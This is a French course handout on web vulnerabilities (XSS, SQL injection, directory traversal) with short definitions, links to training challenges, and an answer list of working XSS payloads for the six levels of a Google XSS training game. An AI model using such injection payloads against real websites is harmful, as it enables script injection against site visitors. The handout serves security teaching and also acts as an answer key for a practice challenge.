# TP et démonstration des vulnérabilitées

## XSS Démonstration

Une attaque XSS consiste à injecter du code malveillant (généralement JavaScript) dans un site web vulnérable, qui est ensuite exécuté par le navigateur des visiteurs légitimes du site, permettant ainsi à l'attaquant de voler des données sensibles ou de manipuler le comportement du site

[TP - Liens du challenge XSS](https://xss-game.appspot.com/)

1.  **TP 15min : Trouver comment faire l'étape1 :** // XSS Simple Script
2.  `<img src='x' onerror=alert('XSS')>` // XSS Persistant
3.  http://xss-game.appspot.com/level3/frame#1' onerror="alert('XSS')"  // XSS URL
4.  `3'); alert('` // XSS Persistant // Échappez à la fonction avec `');` & Appeler la nouvelle alerte avec `('xss`
5.  https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS") // signup, remplacer l'url, cliquer sur go, puis cliquer sur Next
6.  https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(1)

---- 

Deuxiéme challenge XSS (sur hackplaining):

[Challenge XSS](https://www.hacksplaining.com/lessons/xss-stored/start)

## Injection SQL Démonstration

Une injection SQL consiste à insérer du code SQL malveillant dans les entrées utilisateur d'une application web, exploitant ainsi les failles dans la construction des requêtes SQL. L'attaquant peut alors manipuler ou contourner la logique de l'application pour accéder, modifier ou supprimer des données non autorisées dans la base de données

[Challenge SQL](https://www.hacksplaining.com/lessons/sql-injection/start)

## Parcours de répertoire (Accès non autorisé)

Le parcours de répertoire (ou directory traversal) est une attaque où un attaquant manipule les chemins d'accès dans les entrées utilisateur pour accéder à des fichiers ou répertoires sensibles en dehors du répertoire prévu, souvent en utilisant des séquences comme ../ pour remonter dans l'arborescence du système.

[Challenge parcours de répertoire ](https://www.hacksplaining.com/lessons/directory-traversal/start)
